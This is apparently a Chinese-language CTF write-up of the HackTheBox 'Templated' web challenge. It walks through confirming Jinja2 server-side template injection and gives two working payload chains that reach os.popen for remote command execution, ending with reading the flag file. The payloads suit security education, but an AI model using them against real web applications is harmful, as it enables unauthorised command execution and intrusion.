---
title: HTB-Templated
date: 2025-04-02 13:16:48
categories: 
  - CTF
  - Web
tags: [Web,HTB,Injection,Template Injection,模板注入,Jinja2]
excerpt: ""
mathjax: true
---


## **题目描述**

![image-20250327210424995](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327210424995.png)

（无附件）

## **观察**

打开网站会发现一片空白：

![image-20250327210509830](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327210509830.png)

专门提示了是Jinja2，所以大概率是注入，而Jinja2注入的格式为

```python
{{ code }}
```

（以下用server来指代当前网址）

因为没有给网页源代码，所以只能不断尝试。然后会发现当将当前url修改成

```
server/{{7*7}}
```

时，会显示

![image-20250327210938904](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327210938904.png)

可以看到 `7*7` 确实被执行了，所以确定这里就是注入口。

## 渗透

有至少2种方法：

### **第一种**

通过模板中函数对象的  `__globals__`  拿到全局作用域，然后借助 `____builtins__['__import__']__`  导入 `os`  ，用 `os.popen()`  执行命令。

核心链路：

```python
self
↓
__init__                        ← 模板函数对象
↓
__globals__                     ← 函数的全局变量字典
↓
__builtins__['__import__']     ← 导入函数
↓
__import__('os')               ← 导入 os 模块
↓
os.popen('命令').read()        ← 执行命令并读取结果
```



按以下顺序注入：

```python
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

或

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```



![image-20250327213648661](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327213648661.png)

确认了当前注入方式可行。

然后查找 flag 文件：

```python
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```

![image-20250327213726011](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327213726011.png)

最后直接读取flag：

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}
```

![image-20250327213803700](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327213803700.png)



### **第二种**

使用这个模板来发起命令执行（RCE）攻击：

```python
{{ [].__class__.__base__.__subclasses__()[<index>].__init__.__globals__['os'].popen('id').read() }}
```

（需要找到popen对应的index）

首先用

```python
{{ [].__class__.__base__.__subclasses__() }}
```

![image-20250327214655263](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327214655263.png)

列出所有 subclasses，然后通过

```
{% for c in [].__class__.__base__.__subclasses__() %}
  {% if 'Popen' in c.__name__ %}
    {{ loop.index0 }}: {{ c }}
  {% endif %}
{% endfor %}
```

找到 `popen` 的index：

![image-20250327214855996](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327214855996.png)



通过尝试

```python
{{ [].__class__.__base__.__subclasses__()[414].__init__.__globals__['os'].popen('id').read() }}
```

![image-20250327215036879](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327215036879.png)

确认可以成功RCE。

接着就跟之前一样先找然后再读取flag：

```python
{{ [].__class__.__base__.__subclasses__()[414].__init__.__globals__['os'].popen('ls').read() }}
```

![image-20250327215219651](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327215219651.png)


```python
{{ [].__class__.__base__.__subclasses__()[414].__init__.__globals__['os'].popen('cat flag.txt').read() }}
```

![image-20250327215241749](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250327215241749.png)

拿到flag：`HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!}`  。
